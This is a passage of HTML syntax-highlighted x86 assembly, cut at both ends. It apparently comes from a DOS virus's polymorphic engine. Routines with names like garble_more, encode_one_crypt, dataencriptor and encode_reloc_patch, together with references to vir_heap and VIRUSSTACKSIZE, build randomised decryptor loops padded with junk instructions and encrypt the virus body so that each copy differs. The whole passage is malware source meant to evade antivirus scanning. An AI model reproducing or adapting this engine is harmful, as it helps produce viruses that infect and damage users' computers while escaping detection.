    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_ENC_ALL</span><span class="sc0">        </span><span class="sc1">;SET USED 1..3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_one_crypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0">        </span><span class="sc1">;SET USED 4..6</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">garble_more</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.value_Y</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">encode_add</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0">        </span><span class="sc1">;SET USED 4..6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; 87 or 89</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_reg_mem</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;-(X+1)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.value_Y</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;-(X+Y)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reloff_2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mem_access</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;-(X+Y)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.value_J</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;-(J+X+Y)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_add</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                 encoding GOTO loop_top</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_ENC</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opJC</span><span class="sc0">    </span><span class="sc1">;encode JC                     ;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_cond_jmp</span><span class="sc0">                            </span><span class="sc1">;JC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">                </span><span class="sc1">;Shit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.datasize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_add</span><span class="sc0">                           </span><span class="sc1">;ADD INDEX,value_J</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">finish_cJMP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opJZ</span><span class="sc0">   </span><span class="sc1">;encode JZ                     ;JZ</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_cond_jmp</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">                  </span><span class="sc1">;Shit</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;  ENCODE JMP NEAR Loop_Top                                    ;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_jmp_near</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.loop_top</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">        </span><span class="sc1">;;SET USED 0..6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">finish_cJMP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄÂÂÂÄÂÂÄÂÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;ÄÅÁÅÂÁÅÄÅÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;ÄÁÄÁÁÄÁÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;sto_two_byte 0cdh, 2Bh</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_SAVE_REGS</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">USE_PUSHA</span><span class="sc0">
    </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opPOPA</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.reg6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">std</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opPOP_AX</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_JMPS</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opRETN</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_jmp_near</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.jmp_after_decrypt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;crypt data</span><span class="sc0">
</span><span class="sc1">;ÄÅÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÅÄ</span><span class="sc0">
</span><span class="sc1">;ÄÅÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÅÄ</span><span class="sc0">
</span><span class="sc1">;ÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ----------</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.datasize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
     </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.value_J</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">][</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dataencriptor</span><span class="sc0">      </span><span class="sc1">;call encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">][</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.start_reg2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.start_reg3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc1">;ÄÂÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÅÄÄÄÄÄÄÂÄÁÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄ</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÁ             ÄÁÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_reloc_patch</span><span class="sc0">   </span><span class="sc1">;add cs:[r0.(offset addbuf1-relocator_base)], r0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc5">opSEGCS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000100b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">R_BX</span><span class="sc4">*</span><span class="sc2">9</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">10000100b</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.relocator_base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_mem_access</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0"> </span><span class="sc1">;[engdata.sourceptr]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.relocator_base</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0"> </span><span class="sc1">;[engdata.sourceptr]</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">garble_more</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_zero_reg</span><span class="sc0">      </span><span class="sc1">;cl-register result - 2 byte stored</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">;store SUB | XOR R,R : 29, 2Bh, 31, 33</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">    </span><span class="sc1">;cl-register</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">M0D</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">shit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">shit_AX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">                              </span><span class="sc1">;1 to 4 times</span><span class="sc0">
